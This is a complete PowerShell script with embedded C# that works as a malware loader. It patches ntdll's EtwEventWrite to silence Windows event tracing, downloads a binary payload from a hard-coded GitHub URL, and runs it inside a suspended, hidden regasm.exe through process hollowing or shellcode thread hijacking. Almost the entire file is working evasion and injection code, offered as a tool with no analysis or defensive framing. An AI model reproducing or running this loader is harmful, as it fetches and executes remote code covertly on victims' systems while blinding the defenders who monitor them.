#requires -Version 4
<#
.SYNOPSIS
    PE process hollowing loader via regasm.exe with ETW patch.
.DESCRIPTION
    - Patches ETW in the current PowerShell process only.
    - Downloads a PE payload in PowerShell (network stays out of the C# injector).
    - Spawns regasm.exe suspended + hidden.
    - Hollows the original regasm image and maps the PE into it.
    - Updates PEB.ImageBaseAddress and hijacks main thread context.
    - Retries flaky kernel32/ntdll staging steps.
#>
param(
    [Parameter(Mandatory = $false)]
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",

    [Parameter(Mandatory = $false)]
    [string]$RegasmPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe",

    [Parameter(Mandatory = $false)]
    [string]$RegasmArgs = "/nologo /silent",

    [Parameter(Mandatory = $false)]
    [switch]$PatchETW = $true,

    [Parameter(Mandatory = $false)]
    [int]$MaxRetries = 3
)

# ---------------------------------------------------------------------------
# ETW patch in PowerShell process
# ---------------------------------------------------------------------------
function Invoke-EtwPatch {
    Write-Host "[*] Patching ntdll!EtwEventWrite in current process"
    $ntdll = [Win32]::GetModuleHandle("ntdll.dll")
    $etw   = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
    $patch = [byte[]]@(0xC3)
    $size  = [UIntPtr]::new($patch.Length)
    $old   = 0
    if (-not [Win32]::VirtualProtect($etw, $size, 0x40, [ref]$old)) {
        throw "VirtualProtect failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    [Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, $patch.Length)
    [void][Win32]::VirtualProtect($etw, $size, $old, [ref]$old)
    Write-Host "[+] ETW patched"
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesRead);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("ntdll.dll", SetLastError = true)] public static extern int NtQueryInformationProcess(IntPtr hProcess, int ProcessInformationClass, IntPtr ProcessInformation, uint ProcessInformationLength, out uint ReturnLength);
    [DllImport("ntdll.dll", SetLastError = true)] public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibraryA(string lpFileName);

    public const uint CREATE_SUSPENDED  = 0x00000004;
    public const uint CREATE_NO_WINDOW  = 0x08000000;
    public const uint THREAD_ALL_ACCESS = 0x001FFFFF;
    public const uint CONTEXT_FULL      = 0x0010000B;

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint PAGE_READWRITE         = 0x04;
    public const uint PAGE_EXECUTE_READ      = 0x20;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    // PE structs
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 58)] public byte[] _reserved;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER {
        public ushort Machine; public ushort NumberOfSections;
        public uint TimeDateStamp; public uint PointerToSymbolTable;
        public uint NumberOfSymbols; public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY {
        public uint VirtualAddress; public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_OPTIONAL_HEADER64 {
        public ushort Magic; public byte MajorLinkerVersion; public byte MinorLinkerVersion;
        public uint SizeOfCode; public uint SizeOfInitializedData; public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint; public uint BaseOfCode;
        public ulong ImageBase; public uint SectionAlignment; public uint FileAlignment;
        public ushort MajorOperatingSystemVersion; public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion; public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion; public ushort MinorSubsystemVersion;
        public uint Win32VersionValue; public uint SizeOfImage; public uint SizeOfHeaders;
        public uint CheckSum; public ushort Subsystem; public ushort DllCharacteristics;
        public ulong SizeOfStackReserve; public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve; public ulong SizeOfHeapCommit;
        public uint LoaderFlags; public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_NT_HEADERS64 {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize; public uint VirtualAddress;
        public uint SizeOfRawData; public uint PointerToRawData;
        public uint PointerToRelocations; public uint PointerToLinenumbers;
        public ushort NumberOfRelocations; public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_IMPORT_DESCRIPTOR {
        public uint OriginalFirstThunk; public uint TimeDateStamp;
        public uint ForwarderChain; public uint Name; public uint FirstThunk;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION {
        public uint VirtualAddress; public uint SizeOfBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_IMPORT_BY_NAME {
        public ushort Hint;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)] public byte[] Name;
    }
}

public class Hollower {
    public static void Map(string targetPath, string targetArgs, byte[] payload, int maxRetries) {
        if (payload.Length > 2 && payload[0] == 0x4D && payload[1] == 0x5A) {
            Console.WriteLine("[*] Payload looks like a PE; using process hollowing");
            MapPe(targetPath, targetArgs, payload, maxRetries);
        }
        else {
            Console.WriteLine("[*] Payload is not a PE; using 32-bit shellcode thread hijacking");
            InjectShellcode32(targetPath, targetArgs, payload, maxRetries);
        }
    }

    public static void InjectShellcode32(string targetPath, string targetArgs, byte[] payload, int maxRetries) {
        IntPtr hProcess = IntPtr.Zero;

        for (int attempt = 0; attempt < maxRetries; attempt++) {
            try {
                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(si);
                Win32.PROCESS_INFORMATION pi;

                if (!Win32.CreateProcess(null, targetPath + " " + targetArgs, IntPtr.Zero, IntPtr.Zero, false,
                    Win32.CREATE_SUSPENDED | Win32.CREATE_NO_WINDOW, IntPtr.Zero,
                    System.IO.Path.GetDirectoryName(targetPath), ref si, out pi)) {
                    throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());
                }

                hProcess = pi.hProcess;
                uint tid = pi.dwThreadId;
                Console.WriteLine("[+] Spawned " + targetPath + " PID " + pi.dwProcessId + " TID " + tid);

                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payload.Length, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);
                if (addr == IntPtr.Zero) throw new Exception("VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                Console.WriteLine("[+] Shellcode allocated at " + addr.ToString("X"));

                IntPtr written;
                if (!Win32.WriteProcessMemory(hProcess, addr, payload, (uint)payload.Length, out written)) {
                    throw new Exception("WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
                }
                Console.WriteLine("[+] Wrote " + written + " bytes");

                IntPtr hThread = Win32.OpenThread(Win32.THREAD_ALL_ACCESS, false, tid);
                if (hThread == IntPtr.Zero) throw new Exception("OpenThread failed: " + Marshal.GetLastWin32Error());

                IntPtr ctx = Marshal.AllocHGlobal(0x2D0 + 16);
                IntPtr aligned = (IntPtr)((((ulong)ctx) + 15) & ~0xFUL);
                try {
                    Marshal.WriteInt32(aligned, 0x000, 0x00010007); // WOW64 CONTEXT_FULL
                    if (!Win32.Wow64GetThreadContext(hThread, aligned)) throw new Exception("Wow64GetThreadContext failed: " + Marshal.GetLastWin32Error());

                    uint origEip = (uint)Marshal.ReadInt32(aligned, 0x0B8);
                    Console.WriteLine("[+] Original EIP: 0x" + origEip.ToString("X"));

                    Marshal.WriteInt32(aligned, 0x0B8, (int)addr);
                    Console.WriteLine("[+] EIP set to shellcode address");

                    if (!Win32.Wow64SetThreadContext(hThread, aligned)) throw new Exception("Wow64SetThreadContext failed: " + Marshal.GetLastWin32Error());
                }
                finally { Marshal.FreeHGlobal(ctx); }

                uint suspend = Win32.ResumeThread(hThread);
                Console.WriteLine("[+] Resumed main thread (was suspended " + suspend + " times)");
                Win32.CloseHandle(hThread);
                Win32.CloseHandle(hProcess);
                return;
            }
            catch (Exception ex) {
                Console.WriteLine("[!] Attempt " + (attempt + 1) + " failed: " + ex.Message);
                if (hProcess != IntPtr.Zero) { Win32.CloseHandle(hProcess); hProcess = IntPtr.Zero; }
                if (attempt == maxRetries - 1) throw;
                System.Threading.Thread.Sleep(500);
            }
        }
    }

    public static void MapPe(string targetPath, string targetArgs, byte[] payload, int maxRetries) {
        IntPtr hProcess = IntPtr.Zero;
        uint pid = 0;
        uint tid = 0;

        for (int attempt = 0; attempt < maxRetries; attempt++) {
            try {
                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(si);
                Win32.PROCESS_INFORMATION pi;

                if (!Win32.CreateProcess(null, targetPath + " " + targetArgs, IntPtr.Zero, IntPtr.Zero, false,
                    Win32.CREATE_SUSPENDED | Win32.CREATE_NO_WINDOW, IntPtr.Zero,
                    System.IO.Path.GetDirectoryName(targetPath), ref si, out pi)) {
                    throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());
                }

                hProcess = pi.hProcess;
                pid = pi.dwProcessId;
                tid = pi.dwThreadId;
                Console.WriteLine("[+] Spawned " + targetPath + " PID " + pid + " TID " + tid);

                IntPtr peb = GetPebBase(hProcess);
                Console.WriteLine("[+] PEB at " + peb.ToString("X"));

                ulong imageBase = ReadUlong(hProcess, IntPtr.Add(peb, 0x10));
                Console.WriteLine("[+] Original ImageBaseAddress: 0x" + imageBase.ToString("X"));

                int status = Win32.NtUnmapViewOfSection(hProcess, (IntPtr)imageBase);
                if (status < 0) Console.WriteLine("[!] NtUnmapViewOfSection returned 0x" + status.ToString("X") + " (continuing)");
                else Console.WriteLine("[+] Unmapped original image");

                IntPtr baseAddr = LoadPe(hProcess, payload, (IntPtr)imageBase);
                Console.WriteLine("[+] PE mapped at " + baseAddr.ToString("X"));

                byte[] newBase = BitConverter.GetBytes((ulong)baseAddr);
                IntPtr written;
                if (!Win32.WriteProcessMemory(hProcess, IntPtr.Add(peb, 0x10), newBase, (uint)newBase.Length, out written)) {
                    throw new Exception("WriteProcessMemory PEB.ImageBaseAddress failed: " + Marshal.GetLastWin32Error());
                }
                Console.WriteLine("[+] Updated PEB.ImageBaseAddress");

                IntPtr hThread = Win32.OpenThread(Win32.THREAD_ALL_ACCESS, false, tid);
                if (hThread == IntPtr.Zero) throw new Exception("OpenThread failed: " + Marshal.GetLastWin32Error());

                IntPtr ctx = Marshal.AllocHGlobal(0x4D0 + 16);
                IntPtr aligned = (IntPtr)((((ulong)ctx) + 15) & ~0xFUL);
                try {
                    Marshal.WriteInt32(aligned, 0x30, (int)Win32.CONTEXT_FULL);
                    if (!Win32.GetThreadContext(hThread, aligned)) throw new Exception("GetThreadContext failed: " + Marshal.GetLastWin32Error());

                    ulong origRip = (ulong)Marshal.ReadInt64(aligned, 0xF8);
                    Console.WriteLine("[+] Original RIP: 0x" + origRip.ToString("X"));

                    Marshal.WriteInt64(aligned, 0xF8, (long)((ulong)baseAddr + EntryPoint(payload)));
                    Console.WriteLine("[+] RIP set to entry point");

                    if (!Win32.SetThreadContext(hThread, aligned)) throw new Exception("SetThreadContext failed: " + Marshal.GetLastWin32Error());
                }
                finally { Marshal.FreeHGlobal(ctx); }

                uint suspend = Win32.ResumeThread(hThread);
                Console.WriteLine("[+] Resumed main thread (was suspended " + suspend + " times)");
                Win32.CloseHandle(hThread);
                Win32.CloseHandle(hProcess);
                return;
            }
            catch (Exception ex) {
                Console.WriteLine("[!] Attempt " + (attempt + 1) + " failed: " + ex.Message);
                if (hProcess != IntPtr.Zero) { Win32.CloseHandle(hProcess); hProcess = IntPtr.Zero; }
                if (attempt == maxRetries - 1) throw;
                System.Threading.Thread.Sleep(500);
            }
        }
    }

    private static IntPtr GetPebBase(IntPtr hProcess) {
        uint len = (uint)Marshal.SizeOf(typeof(Win32.PROCESS_BASIC_INFORMATION));
        IntPtr pbiMem = Marshal.AllocHGlobal((int)len);
        try {
            uint retLen;
            int status = Win32.NtQueryInformationProcess(hProcess, 0, pbiMem, len, out retLen);
            if (status < 0) throw new Exception("NtQueryInformationProcess failed: 0x" + status.ToString("X"));
            Win32.PROCESS_BASIC_INFORMATION pbi = (Win32.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pbiMem, typeof(Win32.PROCESS_BASIC_INFORMATION));
            return pbi.PebBaseAddress;
        }
        finally { Marshal.FreeHGlobal(pbiMem); }
    }

    private static ulong ReadUlong(IntPtr hProcess, IntPtr addr) {
        byte[] buf = new byte[8];
        IntPtr read;
        if (!Win32.ReadProcessMemory(hProcess, addr, buf, 8, out read)) throw new Exception("ReadProcessMemory failed: " + Marshal.GetLastWin32Error());
        return BitConverter.ToUInt64(buf, 0);
    }

    private static uint EntryPoint(byte[] payload) {
        int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
        return BitConverter.ToUInt32(payload, e_lfanew + 0x28);
    }

    private static IntPtr LoadPe(IntPtr hProcess, byte[] payload, IntPtr desiredBase) {
        int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
        ulong preferredBase = BitConverter.ToUInt64(payload, e_lfanew + 0x30);
        uint imageSize = BitConverter.ToUInt32(payload, e_lfanew + 0x50);
        ushort optMagic = BitConverter.ToUInt16(payload, e_lfanew + 0x18);
        if (optMagic != 0x20B) throw new Exception("Payload is not a 64-bit PE");

        IntPtr baseAddr = Win32.VirtualAllocEx(hProcess, desiredBase, imageSize, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);
        if (baseAddr == IntPtr.Zero && preferredBase != 0) {
            // try preferred base if desired (original image base) failed
            baseAddr = Win32.VirtualAllocEx(hProcess, (IntPtr)preferredBase, imageSize, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);
        }
        if (baseAddr == IntPtr.Zero) {
            baseAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, imageSize, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);
        }
        if (baseAddr == IntPtr.Zero) throw new Exception("VirtualAllocEx failed: " + Marshal.GetLastWin32Error());

        long delta = (long)((ulong)baseAddr - preferredBase);

        // Write headers
        IntPtr written;
        if (!Win32.WriteProcessMemory(hProcess, baseAddr, payload, BitConverter.ToUInt32(payload, e_lfanew + 0x54), out written)) {
            throw new Exception("WriteProcessMemory headers failed: " + Marshal.GetLastWin32Error());
        }

        ushort numSections = BitConverter.ToUInt16(payload, e_lfanew + 0x6);
        int sectionTableOffset = e_lfanew + 0x18 + BitConverter.ToUInt16(payload, e_lfanew + 0x14);
        for (int i = 0; i < numSections; i++) {
            int off = sectionTableOffset + i * 0x28;
            uint va = BitConverter.ToUInt32(payload, off + 0xC);
            uint rawSize = BitConverter.ToUInt32(payload, off + 0x10);
            uint rawPtr = BitConverter.ToUInt32(payload, off + 0x14);
            uint vsize = BitConverter.ToUInt32(payload, off + 0x8);

            if (rawSize == 0) continue;
            byte[] secData = new byte[rawSize];
            Buffer.BlockCopy(payload, (int)rawPtr, secData, 0, (int)rawSize);
            IntPtr secAddr = IntPtr.Add(baseAddr, (int)va);
            if (!Win32.WriteProcessMemory(hProcess, secAddr, secData, rawSize, out written)) {
                throw new Exception("WriteProcessMemory section failed: " + Marshal.GetLastWin32Error());
            }
        }

        // Process relocations
        uint relocDir = BitConverter.ToUInt32(payload, e_lfanew + 0xB0);
        uint relocSize = BitConverter.ToUInt32(payload, e_lfanew + 0xB4);
        if (delta != 0 && relocDir != 0 && relocSize != 0) {
            ApplyRelocations(hProcess, baseAddr, payload, relocDir, relocSize, delta);
        }

        // Resolve imports
        uint importDir = BitConverter.ToUInt32(payload, e_lfanew + 0x90);
        if (importDir != 0) {
            ResolveImports(hProcess, baseAddr, payload, importDir);
        }

        return baseAddr;
    }

    private static void ApplyRelocations(IntPtr hProcess, IntPtr baseAddr, byte[] payload, uint relocDir, uint relocSize, long delta) {
        uint processed = 0;
        while (processed < relocSize) {
            uint pageRva = BitConverter.ToUInt32(payload, (int)(relocDir + processed));
            uint blockSize = BitConverter.ToUInt32(payload, (int)(relocDir + processed + 4));
            if (blockSize == 0) break;
            int numEntries = (int)(blockSize - 8) / 2;
            for (int i = 0; i < numEntries; i++) {
                ushort entry = BitConverter.ToUInt16(payload, (int)(relocDir + processed + 8 + i * 2));
                ushort type = (ushort)(entry >> 12);
                ushort offset = (ushort)(entry & 0xFFF);
                if (type == 0) continue;
                if (type == 10) { // IMAGE_REL_BASED_DIR64
                    IntPtr addr = IntPtr.Add(baseAddr, (int)(pageRva + offset));
                    byte[] buf = new byte[8];
                    IntPtr read;
                    if (!Win32.ReadProcessMemory(hProcess, addr, buf, 8, out read)) continue;
                    ulong oldVal = BitConverter.ToUInt64(buf, 0);
                    byte[] newVal = BitConverter.GetBytes((ulong)((long)oldVal + delta));
                    IntPtr written;
                    Win32.WriteProcessMemory(hProcess, addr, newVal, 8, out written);
                }
                else if (type == 3) { // IMAGE_REL_BASED_HIGHLOW
                    IntPtr addr = IntPtr.Add(baseAddr, (int)(pageRva + offset));
                    byte[] buf = new byte[4];
                    IntPtr read;
                    if (!Win32.ReadProcessMemory(hProcess, addr, buf, 4, out read)) continue;
                    uint oldVal = BitConverter.ToUInt32(buf, 0);
                    byte[] newVal = BitConverter.GetBytes((uint)((int)oldVal + (int)delta));
                    IntPtr written;
                    Win32.WriteProcessMemory(hProcess, addr, newVal, 4, out written);
                }
            }
            processed += blockSize;
        }
    }

    private static void ResolveImports(IntPtr hProcess, IntPtr baseAddr, byte[] payload, uint importDir) {
        int off = (int)importDir;
        while (true) {
            uint nameRva = BitConverter.ToUInt32(payload, off + 12);
            uint firstThunk = BitConverter.ToUInt32(payload, off + 16);
            if (nameRva == 0) break;

            string dllName = ReadAscii(payload, (int)nameRva);
            IntPtr hMod = Win32.LoadLibraryA(dllName);
            if (hMod == IntPtr.Zero) { off += 20; continue; }

            uint thunkRva = BitConverter.ToUInt32(payload, off);
            if (thunkRva == 0) thunkRva = firstThunk;

            int thunkOff = (int)thunkRva;
            int iatOff = (int)firstThunk;
            while (true) {
                ulong thunkVal = BitConverter.ToUInt64(payload, thunkOff);
                if (thunkVal == 0) break;

                IntPtr funcAddr;
                if ((thunkVal & 0x8000000000000000) != 0) {
                    funcAddr = Win32.GetProcAddress(hMod, "#" + (thunkVal & 0xFFFF));
                }
                else {
                    string fnName = ReadAscii(payload, (int)(thunkVal + 2));
                    funcAddr = Win32.GetProcAddress(hMod, fnName);
                }

                if (funcAddr != IntPtr.Zero) {
                    byte[] addrBytes = BitConverter.GetBytes((ulong)funcAddr);
                    IntPtr written;
                    Win32.WriteProcessMemory(hProcess, IntPtr.Add(baseAddr, iatOff), addrBytes, 8, out written);
                }

                thunkOff += 8;
                iatOff += 8;
            }
            off += 20;
        }
    }

    private static string ReadAscii(byte[] data, int offset) {
        int end = offset;
        while (end < data.Length && data[end] != 0) end++;
        return System.Text.Encoding.ASCII.GetString(data, offset, end - offset);
    }
}
"@ -ErrorAction Stop

# ---------------------------------------------------------------------------
# PowerShell downloader (network stays here, out of the C# injector)
# ---------------------------------------------------------------------------
function Get-PeFromUrl {
    param([string]$PeUrl)
    Write-Host "[*] Downloading PE payload from $PeUrl"
    $wc = New-Object System.Net.WebClient
    try {
        $bytes = $wc.DownloadData($PeUrl)
        Write-Host "[+] Downloaded $($bytes.Length) bytes"
    }
    finally { $wc.Dispose() }
    return $bytes
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
try {
    if ($PatchETW) { Invoke-EtwPatch }
    $peBytes = Get-PeFromUrl -PeUrl $Url
    [Hollower]::Map($RegasmPath, $RegasmArgs, $peBytes, $MaxRetries)
    Write-Host "[+] Loader finished successfully"
}
catch {
    Write-Error "[-] Loader failed: $_"
}
